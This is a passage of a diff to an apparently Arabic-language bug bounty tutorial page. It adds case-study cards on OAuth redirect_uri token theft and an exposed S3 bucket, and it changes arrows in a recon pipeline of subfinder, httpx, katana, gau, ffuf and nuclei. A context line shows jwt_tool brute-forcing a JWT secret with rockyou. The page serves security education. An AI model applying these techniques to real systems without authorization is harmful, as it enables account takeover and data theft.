+          <p><strong>الوصف (Scenario):</strong> سرقة رموز التوثيق بتعديل رابط التوجيه (redirect_uri) في طلب المصادقة.</p>
+          <p><strong>الاستغلال (Exploitation):</strong> توجيه الرابط لنطاق فرعي خارجي يسيطر عليه المهاجم لاستلام التوكنز وتخطي الحماية كاملة.</p>
+          <p><strong>المكافأة (Bounty):</strong> <span class="text-neon-green">$4,000</span></p>
         </div>
       </div>
 
@@ -1702,6 +1854,12 @@ jwt_tool jwt_token.txt -C -d rockyou.txt</div>
             </div>
           </div>
         </div>
+      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
+          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: Unsecured S3 Bucket exposes documents</h3></div>
+          <p><strong>الوصف (Scenario):</strong> مستودع تخزين S3 تابع للشركة يحتوي على مستندات العملاء وفواتيرهم متاحاً للعامة دون توثيق.</p>
+          <p><strong>الاستغلال (Exploitation):</strong> سحب كامل محتويات الدليل وقراءة ملفات الـ PDF والنسخ الاحتياطية المسربة.</p>
+          <p><strong>المكافأة (Bounty):</strong> <span class="text-neon-green">$2,000</span></p>
+        </div>
       </div>
 
       <!-- Phase 17: Automation Pipelines -->
@@ -1715,15 +1873,15 @@ jwt_tool jwt_token.txt -C -d rockyou.txt</div>
           <div class="card-header"><h3>🗺️ Advanced Automation pipeline flow</h3></div>
           <div class="flow-visualization">
             <div class="flow-node active-stage">subfinder -d target.com -silent</div>
-            <div class="flow-arrow">▼</div>
+            <div class="flow-arrow">➔</div>
             <div class="flow-node">httpx -silent</div>
-            <div class="flow-arrow">▼</div>
+            <div class="flow-arrow">➔</div>
             <div class="flow-node">katana -jc -silent</div>
-            <div class="flow-arrow">▼</div>
+            <div class="flow-arrow">➔</div>
             <div class="flow-node">gau --threads 5</div>
-            <div class="flow-arrow">▼</div>
+            <div class="flow-arrow">➔</div>
             <div class="flow-node">ffuf -w wordlist.txt</div>
-            <div class="flow-arrow">▼</div>
+            <div class="flow-arrow">➔</div>
             <div class="flow-node">nuclei -severity high,critical</div>
           </div>
         </div>
